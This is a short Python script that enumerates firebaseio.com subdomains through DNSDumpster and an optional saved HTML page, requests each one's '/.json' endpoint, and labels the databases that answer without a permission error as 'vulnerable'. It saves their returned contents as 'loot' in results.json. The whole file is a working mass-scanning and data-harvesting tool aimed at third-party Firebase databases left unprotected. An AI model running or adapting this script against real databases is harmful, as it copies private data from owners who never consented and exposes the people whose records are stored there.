from dnsdumpster.DNSDumpsterAPI import DNSDumpsterAPI
from bs4 import BeautifulSoup
import requests
import json

def clean(domain):
    if domain.count('http://') == 0:
        url = ('https://{}/.json').format(domain)
    else:
        domain = domain.replace('http', 'https')
        url = ('{}.json').format(domain)
    return url


def work(url):
    r = requests.get(url).json()
    if 'error' in r.keys():
        if r['error'] == 'Permission denied':
            return {'status':-1} #successfully protected
        else:
            return {'status':0, 'data':r} #maybe there's a chance for further explotiation
    else:
        return {'status':1, 'data':r} #vulnerable

print('Gathering subdomains using DNSDumpster...')

results = DNSDumpsterAPI().search('firebaseio.com')
domains = [domain['domain'] for domain in results['dns_records']['host']]

try:
    with open('subdomains.html', 'r') as f:
        print('Gathering subdomains through the downloaded file...')
        s = BeautifulSoup(f.read(), 'html.parser')
    
    table = s.find('div', class_='col-xs-12').find('table')
    domains.extend([row.find('a')['href'] for row in table.find('tbody').find_all('tr')[:-1]])
except IOError:
    pass

print('Cleaning and looting!')
urls = list(set(map(clean, domains)))
loot = list(map(work, urls))

print('Saving results to results.json')
with open('results.json', 'w') as f:
    json.dump(loot, f)

l = len([result['status'] for result in loot if result['status'] != -1])
print('Possible vulnerable databases found: {}'.format(l))